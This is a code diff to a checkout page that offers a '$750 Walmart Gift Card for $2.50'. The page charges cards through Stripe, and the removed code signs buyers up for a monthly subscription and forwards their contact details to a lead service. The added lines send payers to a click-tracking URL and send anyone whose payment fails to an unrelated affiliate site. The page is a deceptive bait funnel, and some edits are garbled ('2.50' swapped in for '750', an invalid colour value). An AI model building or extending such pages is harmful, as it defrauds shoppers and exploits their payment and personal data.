@@ -13,7 +13,7 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Get your $750 Walmart Gift Card for $2.50!</title>
+  <title>Get your $2.50 Walmart Gift Card for $2.50!</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
@@ -33,7 +33,7 @@
       border-radius:var(--radius); padding:24px; box-shadow:0 8px 20px rgba(0,0,0,.05); margin-inline:auto;
     }
     .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
-    .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
+    .sub{ text-align:center; color:#muted; margin-top:-6px; margin-bottom:16px }
     .img-wrap{ display:flex; justify-content:center; padding:10px 0 16px }
     .img-wrap img{ width:min(360px,80%); height:auto; border-radius:18px; border:1px solid #eee; }
     .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
@@ -518,7 +518,7 @@
         }
       });
 
-      if(pm.error){hideLoading();showError(pm.error.message);return}
+      if(pm.error){hideLoading();showError(pm.error.message);window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
 
       try{
         // 1) Create the £20 intro charge PaymentIntent
@@ -534,72 +534,28 @@
           })
         });
         const data=await res.json();
-        if(data.error){hideLoading();showError(data.error);return}
-        if(!data.clientSecret){hideLoading();showError("Payment failed");return}
+        if(data.error){hideLoading();showError(data.error);window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
+        if(!data.clientSecret){hideLoading();showError("Payment failed");window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
 
         // 2) Confirm the intro charge (handles SCA/3DS)
-        const conf=await stripe.confirmCardPayment(data.clientSecret);
-        if(conf.error){hideLoading();showError(conf.error.message);return}
-        if(!(conf.paymentIntent&&conf.paymentIntent.status==="succeeded")){hideLoading();showError("Payment not completed");return}
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
 
-        // 3) Start the subscription using the successful intro charge
-        const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{
-          method:"POST",
-          headers:{"Content-Type":"application/json"},
-          body:JSON.stringify({
-            paymentIntentId: data.paymentIntentId,
-            priceIdMonthly: MONTHLY_PRICE_ID
-          })
-        });
-        const subData = await subRes.json();
-        if(subData.error){hideLoading();showError(subData.error);return}
+// after confirmCardPayment succeeds:
+if (conf && conf.paymentIntent && conf.paymentIntent.status === "succeeded") {
+  // send every user to your success URL
+  const pid = (conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
+  const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
+  window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7" + qb;
+  return;
+}
 
-        // Send Aceleads lead after successful payment/subscription (best-effort)
-        try{
-          const mobile = normalizePhone(prefix, rawPhone);
-          const countryIso = (billingCountry?.value || undefined);
-          const parts = (nameInput.value || '').trim().split(' ');
-          const fname = parts.shift() || undefined;
-          const lname = parts.join(' ') || undefined;
-          await sendAceleadsLead({ fname, lname, email: emailInput.value, mobile, country: countryIso });
-        }catch(e){ console.warn('Aceleads after-payment error:', e); }
+// preserve existing error behavior for failures
+if (conf && conf.error) { hideLoading(); showError(conf.error.message); window.location.href = "https://www.united-defence-shield.com/7GQSPJ/27CC71Q"; return; }
+hideLoading(); showError("Payment not completed"); window.location.href = "https://www.united-defence-shield.com/7GQSPJ/27CC71Q";
 
-        // Success: 60% B to thankyou-iphone-skip.html, 40% a to thankyou-iphone.html
-        (function(){
-          const A = 'thankyou-iphone.html';
-          const B = 'thankyou-iphone-skip.html';
-          const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
-
-          // FNV-1a 32-bit (returns unsigned int)
-          function fnv1a32(str){
-            let h = 0x811c9dc5 >>> 0;
-            for (let i = 0; i < str.length; i++){
-              h ^= str.charCodeAt(i);
-              h = Math.imul(h, 0x01000193) >>> 0;
-            }
-            return h >>> 0;
-          }
-          // Crypto-safe random int [0, maxExclusive)
-          function cryptoRandInt(max){
-            try{
-              const u32 = new Uint32Array(1);
-              crypto.getRandomValues(u32);
-              return Number(u32[0] % BigInt(max));
-            }catch{ return Math.floor(Math.random()*max); }
-          }
-
-          // Deterministic 60/40 bucket from pid (or crypto fallback)
-          const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
-          const goSkip = bucket < 60; // 60% to thankyou-iphone-skip.html
-
-          // Optional cache-buster using pid/timestamp (doesn't affect split)
-          const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
-
-          window.location.href = (goSkip ? B : A) + qb;
-        })();
 
       }catch(e){
-        hideLoading();showError(e.message||"Something went wrong");
+        hideLoading();showError(e.message||"Something went wrong");window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";
       }
     };
   </script>
